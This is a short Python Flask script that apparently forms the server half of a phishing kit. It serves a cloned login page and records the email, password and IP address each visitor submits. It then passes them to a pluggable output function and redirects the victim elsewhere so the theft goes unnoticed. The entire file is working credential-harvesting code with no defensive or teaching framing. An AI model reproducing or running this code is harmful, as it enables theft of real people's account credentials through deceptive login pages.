import flask ; from flask import *

def Serve(email_form, password_form, rd, dic, host="0.0.0.0", port="8080"):
    app = Flask(__name__, template_folder="../clone")
    
    # login storage
    class Login:
        email = ""
        pwd = ""
        ip = ""

    # forms
    @app.get("/")
    def index():
        return render_template("index.html")

    @app.post("/login")
    def login():
        Login.ip = request.remote_addr
        Login.email = request.form.get(email_form)
        Login.pwd = request.form.get(password_form)

        ouputfunc = dic["func"]
        res = dic["res"]
        ouputfunc(res=res, Login=Login)
       
        return flask.redirect(rd)

    print("\n-= Flask Logs =-")
    app.run(host=host, port=port)